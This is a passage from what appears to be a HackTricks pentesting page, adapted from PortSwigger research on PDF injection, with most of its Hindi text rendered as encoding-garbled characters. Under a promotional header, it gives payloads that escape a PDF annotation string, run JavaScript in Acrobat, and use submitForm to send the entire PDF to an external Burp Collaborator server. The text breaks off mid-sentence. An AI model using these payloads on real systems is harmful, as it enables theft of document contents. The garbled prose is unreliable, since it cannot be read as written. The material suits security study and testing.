<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>


**рдпрджрд┐ рдЖрдкрдХрд╛ рдЗрдирдкреБрдЯ PDF рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк JavaScript рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдпрд╛ PDF рд╕рд╛рдордЧреНрд░реА рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП PDF рдбреЗрдЯрд╛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration) рд╕реЗ рд▓реА рдЧрдИ рдереА

## PDF-Lib

рдЗрд╕ рдмрд╛рд░, рдореИрдВ [PDFLib](https://pdf-lib.js.org) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛ред рдореИрдВрдиреЗ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдПрдиреЛрдЯреЗрд╢рди рдмрдирд╛рдиреЗ рдФрд░ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рд▓рд┐рдпрд╛ рдХрд┐ рдХреНрдпрд╛ рдореИрдВ рдПрдиреЛрдЯреЗрд╢рди URI рдореЗрдВ рдПрдХ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ - рдФрд░ рдпрд╣ рдХрд╛рдо рдХрд░ рдЧрдпрд╛! рдПрдиреЛрдЯреЗрд╢рди рдХреЛрдб рдЬреЗрдирд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдЬреЛ рдирдореВрдирд╛ рднреЗрджреНрдп рдХреЛрдб рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рд╡рд╣ рдерд╛:

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[рдкреВрд░рд╛ рдХреЛрдб:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

рдореБрдЭреЗ рдХреИрд╕реЗ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди рд╕рдлрд▓ рдерд╛? PDF рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд░реЗрдВрдбрд░ рд╣реЛрддреА рдереА рдЬрдм рддрдХ рдореИрдВрдиреЗ рдПрдХ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдЗрдВрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ред рдЗрд╕рд╕реЗ рд╕рд╛рдмрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд░рд╣рд╛ рдерд╛ рдФрд░ рдЕрдорд╛рдиреНрдп PDF рдХреЛрдб рдХрд╛ рдХрд╛рд░рдг рдмрди рд░рд╣рд╛ рдерд╛ред PDF рдХреЛ рддреЛрдбрд╝рдирд╛ рдЕрдЪреНрдЫрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдореБрдЭреЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдерд╛ рдХрд┐ рдореИрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреВрдВред рдореИрдВрдиреЗ рд░реЗрдВрдбрд░ рдХрд┐рдП рдЧрдП PDF рдХреЛрдб рдХреЛ рджреЗрдЦрд╛ рдФрд░ рджреЗрдЦрд╛ рдХрд┐ рдЖрдЙрдЯрдкреБрдЯ FlateDecode рдлрд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рдерд╛ред рдореИрдВрдиреЗ рдмреНрд▓реЙрдХ рдХреЛ рдбрд┐рдлреНрд▓реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЫреЛрдЯреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓рд┐рдЦреА рдФрд░ рдПрдиреЛрдЯреЗрд╢рди рд╕реЗрдХреНрд╢рди рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрд╛рдИ рджрд┐рдпрд╛:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрдВрдЬреЗрдХреНрд╢рди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдПрдХ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдХреЗ рд╕рд╛рде рдЯреЗрдХреНрд╕реНрдЯ рд╕реАрдорд╛ рдХреЛ рдмрдВрдж рдХрд░ рд░рд╣реА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдПрдХ рдореМрдЬреВрджрд╛ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдмрдЪрддрд╛ рд╣реИ рдЬреЛ PDF рдХреЛ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рд░реЗрдВрдбрд░ рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИ:

![PDF рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрд╡рд╛рдж рджрд┐рдЦрд╛рддреЗ рд╣реБрдП рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

рдмрд╣реБрдд рдмрдврд╝рд┐рдпрд╛, рддреЛ рдореИрдВ PDF рдХреА рд░реЗрдВрдбрд░рд┐рдВрдЧ рдХреЛ рддреЛрдбрд╝ рд╕рдХрддрд╛ рдерд╛, рдЕрдм рдХреНрдпрд╛? рдореБрдЭреЗ рдПрдХ рдРрд╕реЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЖрдиреЗ рдХреА рдЬрд░реВрд░рдд рдереА рдЬреЛ рдХреБрдЫ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ - PDF рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЕрд▓рд░реНрдЯ(1)ред

рдЬреИрд╕реЗ рдХреИрд╕реЗ XSS рд╡реЗрдХреНрдЯрд░реНрд╕ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреА рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВ, PDF рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рднреЗрджреНрдпрддрд╛ PDF рд░реЗрдВрдбрд░рд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддреА рд╣реИред рдореИрдВрдиреЗ Acrobat рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдореБрдЭреЗ рд▓рдЧрд╛ рдХрд┐ рд╡реЗрдХреНрдЯрд░реНрд╕ Chrome рдореЗрдВ рдХрдо рд╕рдВрднрд╛рд╡рдирд╛ рд░рдЦрддреЗ рд╣реИрдВред рджреЛ рдЪреАрдЬреЗрдВ рдЬреЛ рдореИрдВрдиреЗ рджреЗрдЦреАрдВ: 1) рдЖрдк рдЕрддрд┐рд░рд┐рдХреНрдд рдПрдиреЛрдЯреЗрд╢рди рдПрдХреНрд╢рдиреНрд╕ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ 2) рдпрджрд┐ рдЖрдк рдореМрдЬреВрджрд╛ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдХреА рдорд░рдореНрдордд рдХрд░рддреЗ рд╣реИрдВ рддреЛ PDF рд░реЗрдВрдбрд░ рд╣реЛрдЧреАред рдХреБрдЫ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдореИрдВрдиреЗ рдПрдХ рдЕрдЪреНрдЫрд╛ рдкреЗрд▓реЛрдб рдмрдирд╛рдпрд╛ рдЬрд┐рд╕рдиреЗ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдПрдиреЛрдЯреЗрд╢рди рдПрдХреНрд╢рди рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛, рдФрд░ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдХреА рдорд░рдореНрдордд рдХреА:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

рдкрд╣рд▓реЗ рдореИрдВ рдХреЛрд╖реНрдардХ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рддрд╛ рд╣реВрдБ, рдлрд┐рд░ рд╢рдмреНрджрдХреЛрд╢ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП >> рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реВрдБ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдПрдХ рдирдпрд╛ рдПрдиреЛрдЯреЗрд╢рди рд╢рдмреНрджрдХреЛрд╢ рд╢реБрд░реВ рдХрд░реВрдБред /S/JavaScript рдПрдиреЛрдЯреЗрд╢рди рдХреЛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ-рдЖрдзрд╛рд░рд┐рдд рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ /JS рд╡рд╣ рдЬрдЧрд╣ рд╣реИ рдЬрд╣рд╛рдБ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИред рдХреЛрд╖реНрдардХ рдХреЗ рдЕрдВрджрд░ рд╣рдорд╛рд░реА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рд╡реЗ рд╕рдВрддреБрд▓рд┐рдд рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдХреЛрд╖реНрдардХ рдХреЛ рдПрд╕реНрдХреЗрдк рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред рдЕрдВрдд рдореЗрдВ, рдореИрдВ рдПрдиреЛрдЯреЗрд╢рди рдХрд╛ рдкреНрд░рдХрд╛рд░ рдЬреЛрдбрд╝рддрд╛ рд╣реВрдБ, рд╢рдмреНрджрдХреЛрд╢ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рддрд╛ рд╣реВрдБ, рдФрд░ рд╕рдорд╛рдкрди рдХреЛрд╖реНрдардХ рдХреА рдорд░рдореНрдордд рдХрд░рддрд╛ рд╣реВрдБред рдпрд╣ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рдерд╛; рдореИрдВ рдПрдХ рдЗрдВрдЬреЗрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддрд╛ рдерд╛ рдЬреЛ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рдерд╛ рд▓реЗрдХрд┐рди рддреЛ рдХреНрдпрд╛ рд╣реБрдЖ, рд╣реИ рдирд╛? рдЖрдк рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ DOM рддрдХ рдкрд╣реБрдБрдЪ рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдХреБрдХреАрдЬрд╝ рдирд╣реАрдВ рдкрдврд╝ рд╕рдХрддреЗред рдлрд┐рд░ рдЬреЗрдореНрд╕ рдиреЗ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдХрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди рд╕реЗ PDF рдХреА рд╕рд╛рдордЧреНрд░реА рдЪреБрд░рд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред рдореИрдВрдиреЗ PDF рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЛрдВ рдХреЛ рджреЗрдЦрдирд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛ред Acrobat рдореЗрдВ, рдореИрдВрдиреЗ рдкрд╛рдпрд╛ рдХрд┐ рдЖрдк рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХреЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ! рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ API рдХреЗ рд▓рд┐рдП рд╕реНрдкреЗрдХ рджреЗрдЦрддреЗ рд╣реБрдП, рдпрд╣ рдХрд╛рдлреА рд╕реАрдзрд╛ рдерд╛ рдХрд┐ рдореВрд▓ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдФрд░ рдХреБрдЫ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬреЛрдбрд╝реЗрдВ рдЬреЛ рдкреВрд░реА PDF рдХреЛрдб рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ POST рдЕрдиреБрд░реЛрдз рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬреЗрдЧреА:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

рдЕрд▓рд░реНрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ; рдореИрдВрдиреЗ рдЗрд╕реЗ рд╕рд┐рд░реНрдл рдпрд╣ рд╕рд╛рдмрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдХрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣рд╛ рдерд╛ред

рдЕрдЧрд▓рд╛, рд╕рд┐рд░реНрдл рдордЬреЗ рдХреЗ рд▓рд┐рдП, рдореИрдВрдиреЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ PDF рдХреА рд╕рд╛рдордЧреНрд░реА рдЪреБрд░рд╛рдиреЗ рдХреЛ рджреЗрдЦрд╛ред PDF рд╕реНрдкреЗрд╕рд┐рдлрд┐рдХреЗрд╢рди рд╕реЗ, рдореИрдВрдиреЗ рдкрд╛рдпрд╛ рдХрд┐ рдЖрдк рдПрдХ рдПрдХреНрд╢рди рдХ
